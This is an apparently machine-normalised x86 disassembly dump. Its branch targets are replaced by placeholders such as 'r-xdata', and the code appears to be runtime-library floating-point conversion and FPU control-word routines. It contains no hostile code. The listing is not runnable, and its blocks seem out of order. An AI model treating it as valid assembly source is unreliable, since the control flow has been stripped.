and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_41d55c
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_41c824
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rw-data
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rw-data
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_416934
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_416cf0
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_416934
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x54 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x58 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
add esi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x70 ] ecx
mov [ ebp - 0x6c ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jns r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x70 ] 0x2
sub [ ebp - 0x6c ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
cmp [ ebp - 0x10 ] ax
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x70 ]
movzx ecx [ eax ]
mov eax [ ebp - 0x6c ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x48 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x48 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x58 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x58 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_41d11c
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_41d1aa
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_41d24a
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x4 ]
mov bx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
